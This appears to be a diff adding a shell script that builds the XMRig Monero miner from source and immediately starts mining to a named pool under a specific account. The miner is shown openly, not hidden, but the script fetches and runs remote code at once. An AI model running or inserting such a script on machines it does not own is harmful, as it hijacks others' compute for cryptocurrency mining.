@@ -1,0 +1,16 @@
+echo "updating repo ...."
+sudo apt-get update -y
+
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev 
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/build
+cmake ..
+make -j$(nproc)
+
+#read -p 'Input xmrig command example ^ -o bla..bla..bla.. ^: ' var
+
+echo "./xmrig -o xmr.hashcity.org:4444 -u kulaatuh9090.linux -p x -a rx/0" >> go
+
+chmod +x go
+
+sh go
